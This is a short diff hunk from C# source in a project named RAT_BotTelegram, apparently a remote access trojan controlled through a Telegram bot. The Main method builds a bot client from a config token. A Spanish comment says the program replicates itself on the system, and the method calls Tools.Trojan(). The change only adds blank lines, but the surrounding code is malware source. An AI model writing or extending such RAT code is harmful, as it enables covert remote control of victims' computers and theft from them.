@@ -18,7 +18,10 @@ namespace RAT_BotTelegram {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
         public static string Path { get; set; }
         static void Main(string[] args) {
+
             
+
+
             // Se replica en el sistema/
             Tools.Trojan();
 
